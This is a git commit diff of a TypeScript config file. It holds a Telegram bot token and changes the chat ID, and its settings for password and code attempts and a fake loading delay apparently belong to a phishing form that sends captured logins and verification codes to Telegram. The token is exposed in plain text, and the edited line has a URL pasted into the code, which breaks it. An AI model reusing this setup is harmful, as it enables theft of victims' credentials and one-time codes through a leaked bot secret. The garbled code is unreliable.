22e11403d04a8d4d6554fa470a74646bd4d0617c
hehawkltwat1124 <jubinosojkancq7@hotmail.com>
2025-11-05 16:48:25 +0700

    Update config.ts

--- src/utils/config.ts
+++ src/utils/config.ts
@@ -1,6 +1,6 @@
-const config = {
+const config = {https://github.com/hehawkltwat1124/formnew0511/blob/main/src/utils/config.ts
     TOKEN: '8288397640:AAEFdGkEz6bmI7yWukFZoA_DcGysT0f-glw',
-    CHAT_ID: '-3257858837',
+    CHAT_ID: '5050955916',
     MAX_PASS: 2,
     MAX_CODE: 4,
     CODE_LOADING_TIME: 5
